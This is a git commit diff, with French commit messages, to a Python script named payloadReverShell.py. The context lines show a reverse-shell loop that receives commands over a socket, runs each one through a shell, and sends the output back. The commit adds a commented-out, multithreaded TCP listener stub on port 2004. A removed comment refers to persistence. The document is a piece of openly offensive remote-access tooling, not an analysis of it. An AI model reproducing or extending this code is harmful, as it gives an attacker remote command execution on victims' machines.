c63f3594080ed046b72c4604c8e84d2a6e452169
Benjamin Ducoin <megabigben44@gmail.com>
2020-10-23 20:32:43 +0200

    Multithearding en cour

--- payloadReverShell.py
+++ payloadReverShell.py
@@ -42,10 +42,10 @@ finally:
 try:
     import base64
 except ImportError:
-    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
-'base64'])
+    subprocess.check_call([sys.executable, '-m', 'pip3', 'install', 'base64'])
 finally:
     import base64
+"""
 try:
     from pathlib import Path
 except ImportError:
@@ -64,6 +64,8 @@ except ImportError:
     subprocess.check_call([sys.executable, '-m', 'pip3', 'install', 'threading'])
 finally:
     from threading import Thread
+"""
+
 
 
 ## Création du fichier
@@ -187,7 +189,6 @@ while message != "exit":
         process = subprocess.Popen(payloadcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         mon_socket.send(process.stdout.read()+process.stderr.read())
 
-    #if message = "persistant":
     else:
         #print(message)
         process = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -195,6 +196,49 @@ while message != "exit":
 
 
 mon_socket.close()
+
+### Code multithearding en cour
+"""
+class ClientThread(Thread):
+
+    def __init__(self,ip,port):
+        Thread.__init__(self)
+        self.ip = ip
+        self.port = port
+        print "[+] New server socket thread started for " + ip + ":" + str(port)
+
+    def run(self):
+        while True :
+            data = conn.recv(2048)
+            print "Server received data:", data
+            MESSAGE = raw_input("Multithreaded Python server : Enter Response from Server/Enter exit:")
+            if MESSAGE == 'exit':
+                break
+            conn.send(MESSAGE)  # echo
+
+# Multithreaded Python server : TCP Server Socket Program Stub
+TCP_IP = '0.0.0.0'
+TCP_PORT = 2004
+BUFFER_SIZE = 20  # Usually 1024, but we need quick response
+
+tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+tcpServer.bind((TCP_IP, TCP_PORT))
+threads = []
+
+while True:
+    tcpServer.listen(4)
+    print "Multithreaded Python server : Waiting for connections from TCP clients..."
+    (conn, (ip,port)) = tcpServer.accept()
+    newthread = ClientThread(ip,port)
+    newthread.start()
+    threads.append(newthread)
+
+for t in threads:
+    t.join()
+
+"""
+
 
 #    if message == "exit":
 #        mon_socket.close()
